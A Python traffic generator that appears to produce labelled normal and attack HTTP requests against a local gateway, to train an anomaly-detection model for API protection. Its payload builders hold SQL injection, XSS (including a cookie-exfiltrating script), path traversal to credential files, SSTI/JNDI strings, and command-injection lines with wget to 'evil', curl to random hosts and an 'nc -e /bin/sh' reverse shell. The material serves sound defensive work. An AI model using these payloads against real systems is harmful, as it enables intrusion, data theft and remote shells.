"""Traffic generator - stdlib only, no Locust/Cython dependency.

WHY THIS REPLACES bulk_generate.py
----------------------------------
The old generator picked from 16 normal + 19 attack hardcoded (method, path,
body) tuples. Across 11,474 rows there were only 31 distinct feature vectors -
a 99.7% duplicate rate. Any model trained on that memorises 31 points, and a
random train/test split puts byte-identical rows on both sides, which is why the
old pipeline reported F1 0.988 while having learned nothing transferable.

Everything here is parameterised: identifiers, search terms, body lengths,
user agents, header counts, session shapes and attack payload mutations. Two
requests of the same *kind* are almost never identical.

ZERO-DAY EVALUATION
-------------------
Attack families are tagged in the label (`attack:sqli`). NOVEL_FAMILIES are
withheld from meta-learner training by train.py and scored only at test time,
so "detects unseen attacks" becomes a measured number instead of a claim.

LAB-ONLY REQUIREMENT
--------------------
To simulate many distinct clients this sends X-Forwarded-For. The gateway
ignores that header unless GUARD_TRUSTED_PROXY_HOPS >= 1, so run the gateway
with GUARD_TRUSTED_PROXY_HOPS=1 and GUARD_TRUST_LABEL_HEADER=true while
generating data, and with both at their secure defaults in production.
"""
import argparse
import json
import os
import random
import string
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from collections import Counter

GATEWAY = os.getenv("GATEWAY_URL", "http://127.0.0.1:5000")

# Families withheld from meta-training to measure genuine zero-day detection.
NOVEL_FAMILIES = {"cmdi", "exfil", "ssti"}

FIRST = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi",
         "ivan", "judy", "karl", "lena", "mike", "nina", "omar", "priya",
         "quinn", "rosa", "sam", "tina", "umar", "vera", "will", "xena"]
LAST = ["smith", "jones", "khan", "patel", "garcia", "obrien", "muller", "sato",
        "novak", "rossi", "dubois", "silva", "kim", "ahmed", "brown", "nguyen"]
DOMAINS = ["gmail.com", "outlook.com", "yahoo.com", "proton.me", "company.co"]
TERMS = ["laptop", "phone", "headphones", "backpack", "mouse", "keyboard",
         "monitor", "cable", "charger", "case", "stand", "webcam", "desk",
         "chair", "lamp", "speaker", "tablet", "watch", "router", "ssd",
         "admin", "100%", "home appliances", "select a product", "o'brien"]
CATEGORIES = ["Electronics", "Accessories", "Home", "Office", "Audio"]
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Version/17.0 Mobile Safari/604.1",
    "MyApp/2.3.1 (Android 13; Pixel 7)", "okhttp/4.12.0", "PostmanRuntime/7.35.0",
    "python-requests/2.31.0", "curl/8.4.0", "Dalvik/2.1.0 (Linux; Android 12)",
]
SCANNER_UAS = ["sqlmap/1.7", "Nikto/2.5.0", "Nmap Scripting Engine",
               "gobuster/3.6", "Wfuzz/3.1", "masscan/1.3", ""]

_lock = threading.Lock()
_counts = Counter()
_errors = Counter()


def rid(lo=1, hi=5000):
    return random.randint(lo, hi)


def rword(n=8):
    return "".join(random.choices(string.ascii_lowercase, k=n))


# Text that exercises the character-shape features. The previous rtext() joined
# lowercase ASCII words, which left body_upper_ratio and body_nonascii_ratio at
# EXACTLY zero variance across the whole corpus. The trainer's own zero-variance
# guard flags that, and the consequence is precise: a single capital letter in a
# request body becomes an infinitely-many-sigma event, so any client that
# capitalises a name is scored as an attack.
ACCENTED = ["café", "naïve", "piñata", "smörgås", "München", "São Paulo",
            "Zürich", "日本語", "Ürün", "crème"]


def rtext(mean_words=40):
    """Lognormal-ish text length: most comments short, a few genuinely long.

    Deliberately mixes case and occasionally non-ASCII, because real bodies do
    and the feature set measures both.
    """
    n = max(1, int(random.lognormvariate(1.0, 1.1) * mean_words / 3))
    words = []
    for _ in range(min(n, 900)):
        w = random.choice(TERMS + FIRST + LAST)
        r = random.random()
        if r < 0.12:
            w = w.capitalize()
        elif r < 0.15:
            w = w.upper()
        elif r < 0.19:
            w = random.choice(ACCENTED)
        words.append(w)
    txt = " ".join(words)
    # Sentence case, the way anything written by a human arrives.
    return txt[:1].upper() + txt[1:] if txt else txt


def person():
    f, l = random.choice(FIRST), random.choice(LAST)
    return f, l, f"{f}.{l}{random.randint(1, 999)}@{random.choice(DOMAINS)}"


# ── normal traffic ────────────────────────────────────────────────────────────

def _query(pairs, omit_prob=0.35, bare_prob=0.15):
    """Build a query string, dropping each OPTIONAL parameter sometimes.

    This exists because of a measured false-positive cause. The generator used
    to emit `/api/products?page=N&limit=M` on every single session, so the
    corpus contained no example of that endpoint being called WITHOUT a query
    string. The model learned "zero query parameters on /api/products" as an
    anomaly, and a bare `GET /api/products` - the most ordinary request an API
    has - scored 0.9948 against a 0.25 threshold while the paginated form
    scored 0.0003.

    Real clients omit optional parameters. If the corpus never does, the model
    treats the omission as an attack.

    `bare_prob` is a DELIBERATE no-query branch rather than a consequence of the
    per-parameter coin flips. With four optional parameters at 35%, all of them
    vanish only 1.5% of the time - measured at 12 bare requests out of 3,260,
    which left the bare shape effectively unseen. The probability of the most
    ordinary call an endpoint receives must not be the product of independent
    omissions.
    """
    if random.random() < bare_prob:
        return ""
    kept = [(k, v) for k, v in pairs if random.random() > omit_prob]
    random.shuffle(kept)          # order is another axis the corpus was narrow on
    return ("?" + urllib.parse.urlencode(kept)) if kept else ""


def _body(required, optional, omit_prob=0.4):
    """Assemble a JSON body, dropping each OPTIONAL field sometimes.

    The mirror of `_query` for POST and PUT. Every body the generator produced
    carried every field it ever carries: `/api/comments` always sent
    text+product_id+rating, `/api/orders` always product_id+quantity. That makes
    `body_size_z`, `has_body` and `ct_json` a fingerprint of the endpoint rather
    than a description of the request, which is the same failure as the query
    string in a different feature.

    Required fields are always present, so the backend's Pydantic models still
    validate and a 422 stays a real bug rather than a silently dropped row.
    """
    body = dict(required)
    for k, v in optional.items():
        if random.random() > omit_prob:
            body[k] = v
    return body


def normal_requests():
    """One legitimate session: a plausible sequence, not an isolated request."""
    seq = []
    seq.append(("GET", "/api/products" + _query([
        ("page", random.randint(1, 12)),
        ("limit", random.choice([10, 20, 25, 50])),
        ("category", random.choice(CATEGORIES)),
        ("sort", random.choice(["price", "-price", "name", "newest"])),
    ]), None))
    for _ in range(random.randint(1, 5)):
        seq.append(("GET", f"/api/products/{rid(1, 500)}" + _query(
            [("expand", random.choice(["reviews", "stock", "reviews,stock"])),
             ("currency", random.choice(["INR", "USD"]))], bare_prob=0.55), None))
    if random.random() < 0.6:
        # `q` is the only parameter search genuinely requires; everything else
        # is optional and must therefore sometimes be absent.
        seq.append(("GET", "/api/search?q=" + urllib.parse.quote(random.choice(TERMS))
                    + _query([("page", random.randint(1, 5)),
                              ("limit", random.choice([10, 20, 50])),
                              ("category", random.choice(CATEGORIES))]).replace("?", "&"), None))
    if random.random() < 0.45:
        # Real credentials vary in length. Three hardcoded pairs gave this
        # endpoint a body-size standard deviation of half a byte, so any real
        # login sat ten sigma from the calibrated mean.
        f, l, email = person()
        seq.append(("POST", "/api/users/login",
                    {"username": random.choice(
                        [f, f"{f}.{l}", f"{f}{random.randint(1, 9999)}", email,
                         "admin", "john", "jane"]),
                     "password": rword(random.randint(6, 28))}))
    if random.random() < 0.3:
        f, l, email = person()
        seq.append(("POST", "/api/users/register", _body(
            {"username": f"{f}_{rword(random.randint(3, 9))}",
             "password": rword(random.randint(8, 24)),
             "name": f"{f.capitalize()} {l.capitalize()}", "email": email},
            {"phone": f"+{random.randint(1, 99)}{random.randint(10**8, 10**9)}",
             "newsletter": random.choice([True, False])})))
    if random.random() < 0.35:
        seq.append(("GET", f"/api/users/{rid(1, 3)}" + _query([
            ("include", random.choice(["orders", "profile", "orders,profile"])),
            ("fields", random.choice(["id,name", "all"])),
        ]), None))
    # B2: rating and product_id are optional on this endpoint (the backend
    # defaults them), so the corpus must contain bodies without them.
    if random.random() < 0.4:
        seq.append(("POST", "/api/comments", _body(
            {"text": rtext()},
            {"product_id": rid(1, 500), "rating": random.randint(1, 5)})))
    if random.random() < 0.3:
        seq.append(("GET", "/api/comments" + _query([
            ("page", random.randint(1, 20)),
            ("limit", random.choice([10, 20, 50])),
            ("product_id", rid(1, 500)),
        ]), None))
    if random.random() < 0.3:
        seq.append(("POST", "/api/orders", _body(
            # Quantity spanned 1-6, so body_digit_ratio sat four sigma below any
            # client that orders in bulk. Real order sizes are heavy-tailed - but
            # the first correction overshot: a third of orders were bulk and most
            # carried an eight-digit reference, which normalised the digit-heavy
            # shape the enum and logic attacks depend on and dropped their recall
            # from 100% to 33%. Widening the corpus must not swallow the attack.
            {"product_id": rid(1, 500),
             "quantity": random.choices(
                 [random.randint(1, 6), random.randint(5, 40), random.randint(40, 300)],
                 weights=[70, 24, 6])[0]},
            {"note": rtext(4), "gift": random.choice([True, False])},
            omit_prob=0.6)))
    if random.random() < 0.15:
        seq.append(("PUT", f"/api/users/{rid(1,3)}", _body(
            {"name": f"{random.choice(FIRST).capitalize()} Updated"},
            {"email": person()[2], "phone": str(random.randint(10**9, 10**10))})))
    if random.random() < 0.1:
        seq.append(("DELETE", f"/api/orders/{rword(8)}", None))
    # Previously always literally "/api/orders" with zero query variation, and
    # always literally "/health". An endpoint the corpus only ever shows in one
    # shape is an endpoint the model rejects in every other shape.
    if random.random() < 0.2:
        seq.append(("GET", "/api/orders" + _query([
            ("status", random.choice(["confirmed", "pending", "cancelled"])),
            ("limit", random.choice([10, 25, 100])),
            ("since", f"2026-0{random.randint(1,9)}-{random.randint(10,28)}"),
        ], bare_prob=0.45), None))
    if random.random() < 0.12:
        seq.append(("GET", "/health" + _query(
            [("verbose", random.choice(["1", "true"])),
             ("probe", random.choice(["readiness", "liveness"]))],
            bare_prob=0.6), None))
    # Dotted filenames, versioned prefixes and deeper nesting. Without these,
    # path_dot_count and path_depth are effectively constant in training, and
    # any real request containing a '.' (a static asset, a versioned API, a
    # report download) reads as anomalous. Constant training features are the
    # single most reliable source of production false positives here.
    if random.random() < 0.25:
        ext = random.choice(["pdf", "csv", "json", "png", "xlsx"])
        seq.append(("GET", f"/api/files/report.{random.randint(2019,2025)}.{ext}", None))
    if random.random() < 0.2:
        seq.append(("GET", f"/api/v{random.randint(1,3)}/products/{rid(1,500)}"
                    + _query([("expand", "reviews"), ("currency",
                              random.choice(["INR", "USD", "EUR"]))]), None))
    if random.random() < 0.15:
        seq.append(("GET", f"/static/assets/{rword(6)}.min.js", None))
    if random.random() < 0.15:
        seq.append(("GET", f"/api/users/{rid(1,3)}/orders/{rid(1,900)}/items", None))
    # ── features the corpus previously never exercised ───────────────────────
    # Each of these was flagged CONSTANT by train.py's zero-variance guard, which
    # means production traffic carrying any of them reads as a multi-sigma
    # outlier. Constant-in-training is the single most reliable source of false
    # positives in this design, so the generator has to produce them.
    if random.random() < 0.2:
        # Paths, not just query strings. path_nonascii_ratio, path_special_ratio
        # and path_decode_delta are computed on the PATH alone, so accented
        # search terms in ?q= left all three constant at zero.
        seq.append(("GET", "/api/files/" + urllib.parse.quote(
            random.choice(["rapport final.pdf", "année-2026.csv", "über_report.xlsx",
                           "sales (q1).json", "notes#1.txt", "café-menu.pdf"])), None))
    if random.random() < 0.18:
        # non-ASCII and percent-encoding in the query -> q_decode_delta stops
        # being constant
        seq.append(("GET", "/api/search?q=" + urllib.parse.quote(random.choice(ACCENTED))
                    + _query([("category", random.choice(CATEGORIES))],
                             bare_prob=0.5).replace("?", "&"), None))
    if random.random() < 0.12:
        # CORS preflight and cache revalidation: m_other stops being constant
        seq.append((random.choice(["OPTIONS", "HEAD"]),
                    random.choice(["/api/products", "/api/orders", "/api/comments"]), None))
    if random.random() < 0.08:
        # Partial update: m_patch stops being constant
        seq.append(("PATCH", f"/api/users/{rid(1,3)}",
                    _body({"name": random.choice(FIRST).capitalize()},
                          {"email": person()[2]})))
    if random.random() < 0.07:
        # Legitimate traffic that trips a FLAG-severity signature without being
        # an attack: a template-looking search term, a price range with a quote.
        # n_flags was constant 0 across the corpus, so ANY flag hit on real
        # traffic was unseen input. FLAG rules do not block, so these stay
        # correctly labelled normal.
        seq.append(("GET", "/api/search?q=" + urllib.parse.quote(random.choice(
            ["{{price}}", "${total}", "o'brien", "50% off", "<b>sale</b>"])), None))
    if random.random() < 0.12:
        seq.append(("GET", "/api/search?q=" + urllib.parse.quote(random.choice(TERMS))
                    + _query([("sort", random.choice(["price", "name", "-created_at"])),
                              ("filter[status]", "active"),
                              ("in_stock", random.choice(["1", "0"]))],
                             bare_prob=0.0).replace("?", "&"), None))
    random.shuffle(seq)
    return seq


# ── attack payload construction (mutated every call) ──────────────────────────

def _obf(s):
    """Randomly obfuscate so the model cannot key on literal strings."""
    r = random.random()
    if r < 0.25:
        return urllib.parse.quote(s)
    if r < 0.35:
        return urllib.parse.quote(urllib.parse.quote(s))
    if r < 0.55:
        return "".join(c.upper() if random.random() < 0.5 else c for c in s)
    if r < 0.70:
        return s.replace(" ", random.choice(["/**/", "%20", "+", "\t"]))
    return s


def sqli_payload():
    col = random.choice(["password", "username", "email", "token", "card"])
    tbl = random.choice(["users", "accounts", "customers", "admin_users"])
    n = random.randint(1, 9)
    return _obf(random.choice([
        f"' OR '{n}'='{n}' --",
        f"1' OR {n}={n} #",
        f"' UNION SELECT {','.join(['NULL'] * random.randint(2,6))} --",
        f"' UNION ALL SELECT {col} FROM {tbl} --",
        f"'; DROP TABLE {tbl}; --",
        f"'; UPDATE {tbl} SET {col}='{rword()}' WHERE id={n}; --",
        f"1 AND (SELECT COUNT(*) FROM information_schema.tables)>{n} --",
        f"1' AND SLEEP({random.randint(2,9)}) --",
        f"' OR 1=1 LIMIT {n} OFFSET {n} --",
        f"admin'--",
    ]))


def xss_payload():
    fn = random.choice(["alert", "confirm", "prompt", "eval"])
    arg = random.choice(["1", "'xss'", "document.cookie", "document.domain"])
    return _obf(random.choice([
        f"<script>{fn}({arg})</script>",
        f"<img src=x onerror={fn}({arg})>",
        f"<svg onload={fn}({arg})>",
        f"javascript:{fn}({arg})",
        f"<iframe src='javascript:{fn}({arg})'>",
        f"<body onload={fn}({arg})>",
        f"\"><script>document.location='http://{rword()}.com/?c='+document.cookie</script>",
    ]))


def traversal_payload():
    depth = random.randint(2, 8)
    sep = random.choice(["../", "..\\", "....//", "..%2f", "..;/"])
    target = random.choice(["etc/passwd", "etc/shadow", "etc/hosts",
                            "proc/self/environ", "windows/system32/config/sam",
                            "boot.ini", "var/log/auth.log"])
    return _obf(sep * depth + target)


def cmdi_payload():                      # NOVEL family
    cmd = random.choice(["whoami", "id", "uname -a", "cat /etc/passwd",
                         "ls -la /", "curl http://" + rword() + ".com",
                         "wget http://evil/" + rword(), "nc -e /bin/sh 10.0.0.1 4444"])
    return _obf(random.choice([f"; {cmd}", f"| {cmd}", f"& {cmd}",
                               f"`{cmd}`", f"$({cmd})", f"\n{cmd}\n"]))


def ssti_payload():                      # NOVEL family
    return _obf(random.choice([
        "{{7*7}}", "{{config.items()}}", "${7*7}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "<%= system('id') %>", "${jndi:ldap://" + rword() + ".com/a}",
    ]))


ATTACK_BUILDERS = {}


def attack_requests(family):
    """Return a burst of requests for one attack family."""
    if family == "sqli":
        p = sqli_payload()
        return random.choice([
            [("GET", f"/api/search?q={urllib.parse.quote(p, safe='')}", None)],
            [("GET", f"/api/products?id={urllib.parse.quote(p, safe='')}", None)],
            [("POST", "/api/users/login", {"username": p, "password": p})],
            [("GET", f"/api/users/{urllib.parse.quote(p, safe='')}", None)],
        ])
    if family == "xss":
        p = xss_payload()
        return random.choice([
            [("POST", "/api/comments", {"text": p, "product_id": rid(1, 99), "rating": 5})],
            [("POST", "/api/users/register", {"username": p, "password": rword(10),
                                              "name": p, "email": person()[2]})],
            [("GET", f"/api/search?q={urllib.parse.quote(p, safe='')}", None)],
        ])
    if family == "traversal":
        p = traversal_payload()
        return [("GET", f"/{p}" if random.random() < 0.5
                 else f"/api/files/{p}", None)]
    if family == "cmdi":
        p = cmdi_payload()
        return random.choice([
            [("GET", f"/api/ping?host={urllib.parse.quote(p, safe='')}", None)],
            [("POST", "/api/exec", {"cmd": p, "target": rword()})],
            [("POST", "/api/comments", {"text": p, "product_id": rid(), "rating": 5})],
        ])
    if family == "ssti":
        p = ssti_payload()
        return random.choice([
            [("GET", f"/api/render?tpl={urllib.parse.quote(p, safe='')}", None)],
            [("POST", "/api/comments", {"text": p, "product_id": rid(), "rating": 5})],
        ])
    if family == "scan":
        paths = ["/.env", "/.git/config", "/wp-admin", "/wp-login.php", "/phpmyadmin",
                 "/config.php", "/config.json", "/server-status", "/actuator/health",
                 "/api/swagger.json", "/graphql", "/debug/vars", "/.aws/credentials",
                 "/backup.zip", "/dump.sql", "/web.config", "/.svn/entries",
                 "/admin", "/administrator", "/api/internal/debug", "/cgi-bin/test.cgi"]
        return [("GET", random.choice(paths), None)
                for _ in range(random.randint(3, 12))]
    if family == "bruteforce":
        user = random.choice(["admin", "root", "administrator", "test", "user", "oracle"])
        return [("POST", "/api/users/login",
                 {"username": user, "password": rword(random.randint(6, 14))})
                for _ in range(random.randint(15, 45))]
    if family == "flood":
        ep = random.choice(["/api/products", "/api/orders", "/api/comments", "/health"])
        return [("GET", f"{ep}?page={random.randint(1,3)}", None)
                for _ in range(random.randint(40, 120))]
    if family == "exfil":                # NOVEL family - sequential enumeration
        base = random.choice(["/api/users", "/api/orders", "/api/products"])
        start = rid(1, 4000)
        return [("GET", f"{base}/{start + i}", None)
                for i in range(random.randint(25, 80))]
    if family == "payload":
        size = random.randint(20_000, 400_000)
        return [("POST", random.choice(["/api/comments", "/api/products"]),
                 {"text": random.choice(string.ascii_letters) * size,
                  "product_id": rid(), "rating": 5})]
    return []


FAMILIES = ["sqli", "xss", "traversal", "cmdi", "ssti", "scan",
            "bruteforce", "flood", "exfil", "payload"]
FAMILY_WEIGHTS = [18, 14, 12, 8, 6, 12, 10, 6, 8, 6]


# ── transport ─────────────────────────────────────────────────────────────────

def send(method, path, body, label, ip, ua, extra_headers=None):
    url = GATEWAY + urllib.parse.quote(path, safe="/?=&%;'+-<>{}()|*^$,:!~[]\"\\@#")
    headers = {"X-Ground-Truth": label, "X-Forwarded-For": ip, "User-Agent": ua}
    data = None
    if body is not None:
        data = json.dumps(body, ensure_ascii=random.random() < 0.5).encode()
        headers["Content-Type"] = "application/json"
    # Vary header count -- it is a feature, and a constant would be a giveaway.
    # A quarter of sessions are "bare" clients (curl, a health prober, a minimal
    # SDK) that send almost nothing. Without these the model treats a small
    # header count as anomalous, which blocks exactly the kind of automated but
    # legitimate client that monitors an API.
    bare = random.random() < 0.25
    if bare:
        if random.random() < 0.5:
            headers["User-Agent"] = random.choice(["curl/8.4.0", "python-urllib/3.12",
                                                   "Go-http-client/2.0", "wget/1.21"])
        elif random.random() < 0.3:
            headers.pop("User-Agent", None)
    else:
        if random.random() < 0.5:
            headers["Accept"] = random.choice(["application/json", "*/*", "text/html"])
        if random.random() < 0.3:
            headers["Referer"] = f"https://shop.example.com/{rword()}"
        if random.random() < 0.25:
            headers["Accept-Language"] = random.choice(["en-US,en", "en-GB", "fr-FR", "de-DE"])
        if random.random() < 0.2:
            headers["Authorization"] = "Bearer " + rword(32)
    if extra_headers:
        headers.update(extra_headers)

    try:
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        with urllib.request.urlopen(req, timeout=10) as r:
            r.read()
            code = r.status
    except urllib.error.HTTPError as e:
        code = e.code
        try:
            e.read()
        except Exception:
            pass
    except Exception:
        with _lock:
            _errors["transport"] += 1
        return
    with _lock:
        _counts[label.split(":")[0]] += 1
        _counts[f"http_{code}"] += 1


# ── legitimate client profiles ────────────────────────────────────────────────
# CRITICAL FOR FALSE-POSITIVE BEHAVIOUR.
#
# If every fast client in the corpus is an attacker, the model learns
# "high request rate == attack" and then blocks a dashboard, a mobile sync, a
# health prober or a server-to-server integration - all of which burst hard and
# are completely legitimate. That is the exact failure this project claims to
# fix ("static rate-limiters incorrectly block legitimate traffic during
# spikes"), so the training corpus has to contain legitimate spikes.
#
# These profiles stay under the deterministic Layer-1 limits on purpose: they
# are the "fast but allowed" class the model must learn to separate from a
# flood by looking at WHAT is being requested, not just how quickly.

def _profile_human():
    return normal_requests(), (0.05, 0.4)


# Every profile below routes through _query/_body. They used to emit literal
# query strings - "/api/products?page=1&limit=20", limit hardcoded to 50, one
# fixed poller shape repeated 34 times - and between them they carry 42% of all
# generated sessions. That is a large share of the corpus bypassing every
# variation mechanism, which is why widening only normal_requests() moved the
# false-positive rate by less than expected.

def _profile_spa_dashboard():
    """A single-page app loading a dashboard: a fan-out of many small GETs."""
    seq = [("GET", "/api/products" + _query([("page", random.randint(1, 3)),
                                             ("limit", random.choice([10, 20, 24]))]), None),
           ("GET", "/api/orders" + _query([("limit", random.choice([10, 20]))],
                                          bare_prob=0.5), None),
           ("GET", "/api/comments" + _query([("page", 1),
                                             ("limit", random.choice([10, 20]))]), None)]
    for _ in range(random.randint(6, 22)):
        seq.append(("GET", f"/api/products/{rid(1, 500)}"
                    + _query([("expand", "stock")], bare_prob=0.7), None))
    for _ in range(random.randint(0, 4)):
        seq.append(("GET", f"/api/users/{rid(1, 3)}"
                    + _query([("include", "profile")], bare_prob=0.7), None))
    random.shuffle(seq)
    return seq, (0.0, 0.05)


def _profile_integration():
    """Server-to-server batch job: fast, repetitive, bare headers."""
    seq = []
    for _ in range(random.randint(15, 35)):
        r = random.random()
        if r < 0.5:
            seq.append(("GET", f"/api/orders/{rword(8)}", None))
        elif r < 0.75:
            seq.append(("POST", "/api/orders", _body(
                {"product_id": rid(1, 5), "quantity": random.randint(1, 4)},
                {"note": rtext(3), "ref": rword(10)})))
        else:
            seq.append(("GET", "/api/products" + _query([
                ("page", random.randint(1, 40)),
                ("limit", random.choice([50, 100, 200, 500])),
                ("updated_since", f"2026-0{random.randint(1,9)}-01"),
            ], bare_prob=0.1), None))
    return seq, (0.0, 0.04)


def _profile_poller():
    """Uptime monitor / k8s probe: rapid, repetitive, tiny.

    A poller genuinely does repeat one shape, so the variation here is ACROSS
    sessions rather than within one: each session picks its own shape. Without
    that, `/health` appears in the corpus in exactly one form and every other
    form of it reads as an attack.
    """
    ep = random.choice([
        "/health",
        "/health" + _query([("probe", random.choice(["liveness", "readiness"]))], bare_prob=0.0),
        "/api/products" + _query([("limit", random.choice([1, 2, 5]))], bare_prob=0.0),
        "/api/products",
        "/api/orders" + _query([("limit", 1)], bare_prob=0.0),
    ])
    return [("GET", ep, None) for _ in range(random.randint(20, 34))], (0.0, 0.06)


NORMAL_PROFILES = [(_profile_human, 58), (_profile_spa_dashboard, 16),
                   (_profile_integration, 16), (_profile_poller, 10)]


def normal_worker(n_sessions, stop_at):
    fns = [p[0] for p in NORMAL_PROFILES]
    wts = [p[1] for p in NORMAL_PROFILES]
    for _ in range(n_sessions):
        if time.time() > stop_at:
            return
        ip = f"{random.randint(11,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        ua = random.choice(UAS)
        seq, (lo, hi) = random.choices(fns, weights=wts, k=1)[0]()
        for method, path, body in seq:
            send(method, path, body, "normal", ip, ua)
            time.sleep(random.uniform(lo, hi))


def attack_worker(n_sessions, stop_at):
    for _ in range(n_sessions):
        if time.time() > stop_at:
            return
        family = random.choices(FAMILIES, weights=FAMILY_WEIGHTS, k=1)[0]
        ip = f"{random.randint(11,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        ua = random.choice(SCANNER_UAS if random.random() < 0.6 else UAS)
        for method, path, body in attack_requests(family):
            send(method, path, body, f"attack:{family}", ip, ua)
            if family in ("flood", "bruteforce", "exfil", "scan"):
                time.sleep(random.uniform(0.0, 0.02))   # fast by nature
            else:
                time.sleep(random.uniform(0.02, 0.2))


def main():
    ap = argparse.ArgumentParser(description="MicroAPI Guard traffic generator")
    ap.add_argument("--sessions", type=int, default=1400,
                    help="total sessions to simulate")
    ap.add_argument("--attack-ratio", type=float, default=0.30)
    ap.add_argument("--threads", type=int, default=16)
    ap.add_argument("--max-seconds", type=int, default=1800)
    ap.add_argument("--seed", type=int, default=None)
    args = ap.parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    try:
        with urllib.request.urlopen(GATEWAY + "/__guard/health", timeout=5) as r:
            h = json.loads(r.read())
        print(f"  gateway mode={h.get('mode')} models={h.get('models_loaded')}")
        if h.get("mode") == "enforce":
            print("  WARNING: gateway is ENFORCING. Blocked attacks never reach the")
            print("           backend, which is fine, but for a training corpus you")
            print("           usually want GUARD_MODE=monitor.")
    except Exception as e:
        print(f"  ERROR: gateway not reachable at {GATEWAY} ({e})")
        return 1

    n_attack = int(args.sessions * args.attack_ratio)
    n_normal = args.sessions - n_attack
    stop_at = time.time() + args.max_seconds
    print(f"  sessions: {n_normal} normal + {n_attack} attack "
          f"across {args.threads} threads\n")

    threads = []
    nt = max(1, args.threads * 2 // 3)
    at = max(1, args.threads - nt)
    for i in range(nt):
        threads.append(threading.Thread(
            target=normal_worker, args=(n_normal // nt + 1, stop_at), daemon=True))
    for i in range(at):
        threads.append(threading.Thread(
            target=attack_worker, args=(n_attack // at + 1, stop_at), daemon=True))

    t0 = time.time()
    for t in threads:
        t.start()
    while any(t.is_alive() for t in threads):
        time.sleep(2)
        with _lock:
            tot = _counts["normal"] + _counts["attack"]
        el = time.time() - t0
        sys.stdout.write(f"\r  {tot:,} requests  {tot/max(el,1):.0f} req/s  "
                         f"{el:.0f}s elapsed   ")
        sys.stdout.flush()
    for t in threads:
        t.join(timeout=10)

    print("\n\n" + "=" * 56)
    print("  GENERATION COMPLETE")
    print("=" * 56)
    for k, v in sorted(_counts.items()):
        print(f"  {k:12s} {v:8,}")
    if _errors:
        print(f"  transport errors: {dict(_errors)}")
    print(f"  elapsed: {time.time()-t0:.0f}s")
    return 0


if __name__ == "__main__":
    sys.exit(main())
